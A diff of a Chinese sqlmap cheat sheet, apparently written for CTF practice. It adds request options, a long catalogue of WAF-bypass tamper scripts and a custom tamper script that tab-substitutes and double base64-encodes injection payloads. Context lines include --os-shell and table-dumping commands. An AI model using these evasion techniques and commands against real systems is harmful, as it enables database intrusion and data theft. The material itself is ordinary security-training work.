@@ -78,7 +78,7 @@ sqlmap.py -d "mysql://root:123456@127.0.0.1:3306/mysql" --os-shell
 -v 3      查看注入时使用的语句
 
 --is-dba      看是否是管理员高权限
-、
+
 --privilege    查看权限
 --current-user   查看当前登录数据库的用户名
 
@@ -129,7 +129,25 @@ password字段可能会顺带解密
 --skip="user-agent referer"  跳过注入
 
 --threads 10  默认1，设置为10线程方便脱裤
+--time-sec 10 延时盲注时间，默认5
 ```
+
+^
+## **请求方式**
+```
+--user-agent sqlmap 
+--referer http://9.challenge.ctf.show/sqlmap.php
+
+请求方式：
+--data="id=1" --method=PUT --headers="Content-Type: text/plain" 
+
+每次请求之前要去请求一个安全链接
+--safe-url="http://55bec546-a2a9-4ccc-9347-df357c6b8fa8.challenge.ctf.show/api/getToken.php" --safe-freq=1 
+
+```
+
+
+^
 ## **绕过防护**
 ```
 --random-agent  随机UA，防止WAF
@@ -143,10 +161,51 @@ sqlmap的tamper/文件中自带脚本
 
 between: <>=换成between
 space2comment: 空格用/**/替换
+如果过滤的空格又过滤了*，则不能/**/替换
+复制space2comment这个脚本，把里面的/**/换成chr(0x9)等
+
 randomcase: 随机字母大小写
 symboliclogical: 替换or and
 
 base64编码、url编码、双url编码、宽字节、使用/**/分割sql关键字、替换空格为xx
+
+
+
+apostrophemask.py 用utf8代替引号
+equaltolike.py MSSQL * SQLite中like 代替等号
+
+greatest.py MySQL中绕过过滤’>’ ,用GREATEST替换大于号
+space2hash.py 空格替换为#号 随机字符串 以及换行符
+space2comment.py 用/**/代替空格
+apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号
+halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论
+space2morehash.py MySQL中空格替换为 #号 以及更多随机字符串 换行符
+appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码
+ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤
+space2mssqlblank.py mssql空格替换为其它空符号
+base64encode.py 用base64编码
+space2mssqlhash.py mssql查询中替换空格
+modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释
+space2mysqlblank.py mysql中空格替换其它空白符号
+between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（>）
+space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）
+multiplespaces.py 围绕SQL关键字添加多个空格
+space2plus.py 用+替换空格
+bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like
+nonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示 suitable for替代
+space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集
+sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾
+chardoubleencode.py 双url编码(不处理以编码的)
+unionalltounion.py 替换UNION ALL SELECT UNION SELECT
+charencode.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；
+randomcase.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写
+unmagicquotes.py 宽字符绕过 GPC addslashes
+randomcomments.py 用/**/分割sql关键字
+charunicodeencode.py ASP，ASP.NET中字符串 unicode 编码
+securesphere.py 追加特制的字符串
+versionedmorekeywords.py MySQL >= 5.1.13注释绕过
+halfversionedmorekeywords.py MySQL < 5.1中关键字前加注释
+
 ```
 ## **获取shell，文件操作等**
 ```
@@ -181,7 +240,7 @@ sqlmap -u "http://localhost:30008/" --data="id=1"
 sqlmap -u "http://127.0.0.1:8888/Less-1/?id=1" --dump -C'id,username,password' -T 'users' -D 'security' --start=1 --stop=5
 ```
 
-![](https://0b4e0933.sqlsec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A6%82%E8%BF%B0/imgs/image-20200721213636280.png)
+
 
 如果要证明某个表下面的数量的话，直接使用 sqlmap 的 `--count` 参数即可
 
@@ -189,4 +248,72 @@ sqlmap -u "http://127.0.0.1:8888/Less-1/?id=1" --dump -C'id,username,password' -
 sqlmap -u "http://127.0.0.1:8888/Less-1/?id=1" --count -T 'users' -D 'security'
 ```
 
-![image-20200721213755305](https://0b4e0933.sqlsec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A6%82%E8%BF%B0/imgs/image-20200721213755305.png)
+
+^
+## **自定义脚本模板**
+```
+#!/usr/bin/env python
+
+"""
+Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
+See the file 'LICENSE' for copying permission
+"""
+
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+import base64
+__priority__ = PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    Replaces space character (' ') with comments '/**/'
+
+    Tested against:
+        * Microsoft SQL Server 2005
+        * MySQL 4, 5.0 and 5.5
+        * Oracle 10g
+        * PostgreSQL 8.3, 8.4, 9.0
+
+    Notes:
+        * Useful to bypass weak and bespoke web application firewalls
+
+    >>> tamper('SELECT id FROM users')
+    'SELECT/**/id/**/FROM/**/users'
+    """
+
+    retVal = payload
+
+    if payload:
+        retVal = ""
+        quote, doublequote, firstspace = False, False, False
+
+        for i in xrange(len(payload)):
+            if not firstspace:
+                if payload[i].isspace():
+                    firstspace = True
+                    retVal += chr(0x9)
+                    continue
+
+            elif payload[i] == '\'':
+                quote = not quote
+
+            elif payload[i] == '"':
+                doublequote = not doublequote
+
+            elif payload[i] == '=':
+                retVal += chr(0x9) + 'like' + chr(0x9)
+                continue
+
+            elif payload[i] == " " and not doublequote and not quote:
+                retVal += chr(0x9)
+                continue
+
+            retVal += payload[i]
+    payload_ret = retVal
+    retVal = base64.b64encode(base64.b64encode(payload_ret[::-1].encode()).decode()[::-1].encode()).decode()
+
+    return retVal
+```
